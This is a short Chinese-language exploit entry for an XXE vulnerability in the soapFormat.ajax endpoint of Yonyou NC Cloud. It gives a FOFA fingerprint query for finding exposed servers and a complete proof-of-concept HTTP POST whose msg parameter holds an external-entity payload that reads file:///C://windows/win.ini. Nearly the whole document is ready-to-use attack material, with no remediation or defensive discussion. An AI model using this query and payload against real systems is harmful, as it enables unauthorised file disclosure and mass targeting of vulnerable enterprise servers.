## 用友NC_Cloud_soapFormat.ajax接口存在XXE

## fofa
```
body="/Client/Uclient/UClient.exe"||body="ufida.ico"||body="nccloud"||body="/api/uclient/public/"
```

## poc
```
POST /uapws/soapFormat.ajax HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Connection: close
Host: 127.0.0.1
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 259

msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:///C://windows/win.ini"> ]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a
```
